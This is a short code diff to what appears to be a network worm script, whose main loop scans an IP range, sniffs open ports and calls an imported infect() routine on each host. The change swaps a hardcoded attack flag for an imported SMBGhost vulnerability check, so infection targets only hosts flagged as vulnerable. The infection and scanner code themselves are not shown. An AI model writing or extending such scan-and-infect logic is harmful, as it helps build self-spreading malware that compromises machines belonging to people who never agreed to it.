@@ -1,7 +1,7 @@
-import sys
-import time
+import sys, time
 from sniff import sniff
 from infect import infect
+import armory.SMBGhost.cve20220796scanner  as cve20220796
 import sqlite3
 
 
@@ -16,7 +16,7 @@ def main(ip_range):
             cur = con.cursor()
             for each_port in target_port_details[target_ip.address]["ports"]:
                 #attack = network.is_vulnerable(cur,each_port)
-                attack = True
+                attack = cve20220796.is_vulnerable(target_ip.address)
                 if attack:
                     infection = infect(target_ip.address)
             con.close()
